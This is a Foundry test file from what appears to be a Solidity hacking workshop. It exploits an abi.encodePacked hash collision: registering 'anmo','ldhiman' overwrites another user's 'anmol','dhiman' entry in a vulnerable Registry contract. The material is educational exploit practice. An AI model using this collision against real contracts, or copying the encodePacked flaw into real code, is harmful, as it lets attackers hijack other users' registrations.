// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Registry} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise11_Registry is Test {
    Registry public registry;

    function setUp() public {
        registry = new Registry();
    }

    // bytes32 id1 = keccak(abi.encodePacked("anmol","dhiman"));
    // bytes32 id2 = keccak(abi.encodePacked("anmo","ldhiman"));
    // both id1 and id2 are same, id collision occur with abi.encodePacked()
    function test_register() public {
        // other user registering under hi name as - anmol dhiman
        address userA = vm.addr(1);
        bytes32 ID = keccak256(abi.encodePacked("anmol", "dhiman", uint256(1)));
        vm.startPrank(userA);
        registry.register("anmol", "dhiman", 1);
        (address payable regAddress, , , , , ) = registry.users(ID);
        require(userA == regAddress);
        vm.stopPrank();

        // attacking...
        registry.register("anmo", "ldhiman", 1);
        (address payable addressAfterAttack, , , , , ) = registry.users(ID);
        require(address(this) == addressAfterAttack);
    }
}
